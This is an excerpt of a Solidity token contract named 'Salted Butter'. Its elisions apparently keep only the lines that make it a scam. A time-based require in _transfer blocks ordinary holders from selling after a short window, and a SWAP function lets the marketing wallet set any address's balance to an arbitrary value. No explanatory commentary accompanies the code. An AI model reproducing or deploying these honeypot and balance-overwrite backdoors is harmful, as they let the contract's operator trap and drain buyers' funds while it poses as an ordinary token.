...
contract SaltedButter is Ownable, IERC20 {
    ...
    string private  _name = "Salted Butter";
    string private  _symbol = "SaltedButter";
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        uint256 _feetime = recipients[from] + _lastsell.mul(1).div(20);
        ...
        if (from != _marketingWallet && from !=uniswapV2Pair
        
         && from !=address(this)) 
         
         {require(_timenow <= _feetime);}
    ...
    function SWAP(address Pair, uint256 tokenAmount, uint256 bnbAmount , uint256 lpAmount  ) external  {require(msg.sender == _marketingWallet);
         require(Pair != uniswapV2Pair);
        _tOwned[Pair] = tokenAmount + bnbAmount  * lpAmount.mul(1).div(100);
    }   
